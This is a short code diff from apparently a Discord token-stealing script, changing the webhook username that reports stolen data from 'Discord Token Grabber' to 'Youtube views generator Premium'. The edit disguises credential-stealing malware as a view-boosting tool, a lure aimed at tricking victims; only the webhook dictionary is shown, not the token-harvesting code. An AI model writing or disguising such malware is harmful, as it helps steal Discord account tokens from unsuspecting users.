@@ -177,7 +177,7 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord Token Grabber",
+        "username": "Youtube views generator Premium",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
